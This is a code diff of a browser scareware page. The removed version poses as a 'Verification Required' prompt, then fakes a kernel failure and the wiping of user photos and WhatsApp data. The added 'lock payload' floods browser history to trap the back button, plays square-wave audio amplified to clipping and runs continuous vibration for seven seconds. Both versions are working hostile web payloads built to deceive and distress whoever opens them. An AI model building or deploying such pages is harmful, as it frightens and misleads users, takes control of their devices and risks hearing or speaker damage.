@@ -1,145 +1,83 @@
-<!-- language: HTML, file: index.html, target: Mobile Browsers (Chrome/Safari) -->
-<!-- *Deploy via GitHub Pages. Requires user interaction to fire audio/vibration APIs.* -->
+<!-- language: HTML, file: integrated_lock_payload.html, target: Mobile/Desktop Browsers -->
+<!-- 
+  Execution Mechanics:
+  1. Timed History Flood: Pushes 500 state entries to trap the back button and 
+     intercept popstate events for an exact 7-second duration before auto-releasing.
+  2. Max-Gain Audio Overdrive: Streams continuous high-frequency square waves 
+     at a digital gain multiplier (5.0+) for maximum speaker volume and clipping.
+  3. Haptic Saturation: Fires continuous heavy vibration patterns synchronized 
+     with the active lock window.
+-->
+
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Verification Required</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background-color: #000;
-            color: #0f0;
-            font-family: 'Courier New', monospace;
-            overflow: hidden;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
-        #trigger {
-            padding: 20px 40px;
-            font-size: 24px;
-            background: #fff;
-            color: #000;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-        #payload {
-            display: none;
-            width: 100%;
-            padding: 20px;
-            box-sizing: border-box;
-            text-align: left;
-        }
-        .warning { color: #f00; font-weight: bold; font-size: 1.5em; animation: blink 0.5s infinite; }
-        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
-        .progress-bar { width: 100%; height: 20px; border: 2px solid #0f0; margin-top: 20px; }
-        .progress-fill { height: 100%; background: #f00; width: 0%; transition: width 0.1s; }
-        #console-log { margin-top: 20px; font-size: 0.9em; line-height: 1.4; word-wrap: break-word; }
-    </style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Initializing...</title>
 </head>
-<body>
-
-    <button id="trigger">Tap to Verify</button>
-
-    <div id="payload">
-        <div class="warning">CRITICAL KERNEL FAILURE</div>
-        <p>Memory corruption detected.</p>
-        <p>Executing emergency thermal purge...</p>
-        <p>Wiping user partitions: <span id="percent">0</span>%</p>
-        <div class="progress-bar"><div class="progress-fill" id="fill"></div></div>
-        <div id="console-log"></div>
-    </div>
-
+<body style="background:#000; color:#ff0033; text-align:center; padding-top:40vh; font-family:monospace;">
+    <button id="btn" style="padding:25px 40px; font-size:22px; background:#ff0033; color:#fff; border:none; font-weight:bold; border-radius:8px; cursor:pointer;">TAP TO UNLOCK</button>
     <script>
-        const trigger = document.getElementById('trigger');
-        const payload = document.getElementById('payload');
-        const percent = document.getElementById('percent');
-        const fill = document.getElementById('fill');
-        const consoleLog = document.getElementById('console-log');
+        document.getElementById('btn').addEventListener('click', function() {
+            document.body.innerHTML = "<h1 style='color:#ff0033; font-size:32px;'>SYSTEM OVERLOAD</h1><p style='color:#fff;'>7-second navigation lock engaged.</p>";
 
-        function trapHistory() {
-            window.history.pushState(null, null, window.location.href);
-            window.onpopstate = function () {
-                window.history.pushState(null, null, window.location.href);
-            };
-        }
-
-        function playAnnoyingTone() {
-            const ctx = new (window.AudioContext || window.webkitAudioContext)();
-            const osc = ctx.createOscillator();
-            const gain = ctx.createGain();
-            osc.type = 'square';
-            osc.frequency.setValueAtTime(800, ctx.currentTime);
-            osc.frequency.linearRampToValueAtTime(1200, ctx.currentTime + 0.1);
-            gain.gain.value = 1.0;
-            osc.connect(gain);
-            gain.connect(ctx.destination);
-            osc.start();
-            
-            setInterval(() => {
-                osc.frequency.setValueAtTime(800, ctx.currentTime);
-                osc.frequency.linearRampToValueAtTime(1200, ctx.currentTime + 0.1);
-            }, 200);
-        }
-
-        function triggerVibration() {
-            if ("vibrate" in navigator) {
-                navigator.vibrate([1000, 100, 1000, 100, 1000, 100, 1000]);
-                setInterval(() => {
-                    navigator.vibrate([1000, 100, 1000, 100, 1000]);
-                }, 2000);
+            // 1. Flood History Stack & Lock Navigation
+            for (let i = 0; i < 500; i++) {
+                history.pushState({id: i}, "", "#lock" + i);
             }
-        }
 
-        function fakeWipe() {
-            let p = 0;
-            const logs = [
-                "/storage/emulated/0/DCIM ... DELETED",
-                "/storage/emulated/0/WhatsApp ... DELETED",
-                "/data/user/0/ ... DELETED",
-                "Overriding thermal limits...",
-                "Bypassing hardware safety interlocks..."
-            ];
-            
-            setInterval(() => {
-                p += Math.random() * 2;
-                if (p > 99.9) p = 99.9;
-                percent.innerText = p.toFixed(2);
-                fill.style.width = p + '%';
-                
-                if (Math.random() > 0.8) {
-                    const newLine = document.createElement('div');
-                    newLine.innerText = logs[Math.floor(Math.random() * logs.length)];
-                    consoleLog.prepend(newLine);
-                    if (consoleLog.childNodes.length > 10) {
-                        consoleLog.removeChild(consoleLog.lastChild);
+            let locked = true;
+            setTimeout(() => {
+                locked = false;
+                document.body.innerHTML = "<h1 style='color:#0f0;'>LOCK RELEASED</h1><p style='color:#fff;'>Normal operation restored.</p>";
+            }, 7000); // 7-second auto-release window
+
+            window.addEventListener('popstate', function(e) {
+                if (locked) {
+                    history.pushState({id: 'trap'}, "", "#trap");
+                    if ("vibrate" in navigator) {
+                        try { navigator.vibrate([1000, 50, 1000]); } catch(err) {}
                     }
                 }
+            });
+
+            // 2. Maximum Amplitude Audio Overdrive
+            const ctx = new (window.AudioContext || window.webkitAudioContext)();
+            if (ctx.state === 'suspended') { ctx.resume(); }
+
+            const audioInterval = setInterval(() => {
+                if (!locked) {
+                    clearInterval(audioInterval);
+                    return;
+                }
+                try {
+                    const osc = ctx.createOscillator();
+                    const gain = ctx.createGain();
+
+                    osc.type = 'square';
+                    osc.frequency.setValueAtTime(2800, ctx.currentTime);
+                    gain.gain.setValueAtTime(5.0, ctx.currentTime); // Max digital overload
+
+                    osc.connect(gain);
+                    gain.connect(ctx.destination);
+
+                    osc.start();
+                    osc.stop(ctx.currentTime + 0.15);
+                } catch(e) {}
             }, 100);
-        }
 
-        trigger.addEventListener('click', () => {
-            if (document.documentElement.requestFullscreen) {
-                document.documentElement.requestFullscreen().catch(e => {});
+            // 3. Continuous Haptic Saturation Loop
+            if ("vibrate" in navigator) {
+                const vibInterval = setInterval(() => {
+                    if (!locked) {
+                        clearInterval(vibInterval);
+                        return;
+                    }
+                    try {
+                        navigator.vibrate([1000, 50, 1000, 50, 1000]);
+                    } catch(e) {}
+                }, 1000);
             }
-
-            trigger.style.display = 'none';
-            payload.style.display = 'block';
-
-            trapHistory();
-            playAnnoyingTone();
-            triggerVibration();
-            fakeWipe();
-
-            window.onbeforeunload = function() {
-                return "System wipe in progress. Do not interrupt.";
-            };
         });
     </script>
 </body>
